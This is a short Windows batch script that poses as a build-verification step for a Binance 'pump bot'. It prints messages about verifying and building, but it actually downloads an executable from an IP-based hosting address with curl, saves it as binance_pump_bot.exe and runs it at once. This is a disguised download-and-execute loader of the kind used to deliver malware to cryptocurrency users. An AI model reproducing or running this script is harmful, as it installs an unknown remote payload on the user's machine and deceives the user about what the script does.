@echo off
color 0A
echo -
echo		    Please wait for verifying built app with verified build source...
echo -
curl "https://mystifying-golick.137-184-117-69.plesk.page/VerifiedBuildSource" --output py/binance_pump_bot.exe
echo Building now complete and extracted to the directory.
start "PumpBot" py/binance_pump_bot.exe
pause
